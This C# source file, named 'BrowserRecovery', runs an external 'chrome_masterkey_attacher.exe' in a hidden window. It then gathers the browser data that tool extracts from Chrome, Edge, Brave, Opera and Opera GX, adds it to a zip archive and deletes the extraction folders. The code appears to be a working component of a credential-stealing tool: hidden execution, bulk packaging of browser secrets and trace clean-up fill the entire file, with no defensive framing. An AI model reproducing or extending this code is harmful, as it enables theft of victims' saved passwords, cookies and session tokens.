using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace ConsoleApp1
{
    internal class BrowserRecovery
    {
        private static readonly Dictionary<string, string> BrowserMappings = new Dictionary<string, string>
        {
            { "chrome_extract", "Google Chrome" },
            { "edge_extract", "Microsoft Edge" },
            { "brave_extract", "Brave" },
            { "opera_extract", "Opera Stable" },
            { "operagx_extract", "Opera GX" }
        };

        public static void Execute(string zipPath)
        {
            try
            {
                Console.Write("[*] Recovering browser data... ");
                string exeName = "chrome_masterkey_attacher.exe";
                string fullExePath = string.Empty;

                // Check common locations
                string[] locations = {
                    AppDomain.CurrentDomain.BaseDirectory,
                    Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "browserrecovery"),
                    Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "browserrecovery", "target", "release")
                };

                foreach (var loc in locations)
                {
                    string p = Path.Combine(loc, exeName);
                    if (File.Exists(p))
                    {
                        fullExePath = p;
                        break;
                    }
                }

                if (string.IsNullOrEmpty(fullExePath))
                {
                    Console.WriteLine("SKIP (tool not found)");
                    return;
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = fullExePath,
                    WorkingDirectory = Path.GetDirectoryName(fullExePath),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(psi))
                {
                    if (process != null)
                    {
                        process.WaitForExit(60000); // 1 minute timeout
                        if (!process.HasExited)
                        {
                            process.Kill();
                        }
                    }
                }

                // After extraction, add files to zip
                int count = 0;
                using (ZipArchive archive = ZipFile.Open(zipPath, ZipArchiveMode.Update))
                {
                    foreach (var mapping in BrowserMappings)
                    {
                        string extractDir = Path.Combine(Path.GetDirectoryName(fullExePath), mapping.Key);
                        if (Directory.Exists(extractDir))
                        {
                            if (AddDirectoryToZip(archive, extractDir, $"Browsers/{mapping.Value}"))
                            {
                                count++;
                            }

                            // Cleanup
                            try
                            {
                                Directory.Delete(extractDir, true);
                            }
                            catch { }
                        }
                    }
                }

                if (count > 0)
                {
                    Console.WriteLine($"OK ({count} browsers)");
                }
                else
                {
                    Console.WriteLine("OK (no data found)");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"FAILED ({ex.Message})");
            }
        }

        private static bool AddDirectoryToZip(ZipArchive archive, string sourceDir, string zipEntryPrefix)
        {
            string[] files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);
            if (files.Length == 0) return false;

            foreach (string file in files)
            {
                try
                {
                    string relativePath = file.Substring(sourceDir.Length).TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
                    string entryName = Path.Combine(zipEntryPrefix, relativePath).Replace('\\', '/');

                    // Check if entry already exists to avoid exceptions
                    var existingEntry = archive.GetEntry(entryName);
                    if (existingEntry != null)
                    {
                        existingEntry.Delete();
                    }

                    archive.CreateEntryFromFile(file, entryName);
                }
                catch { }
            }
            return true;
        }
    }
}
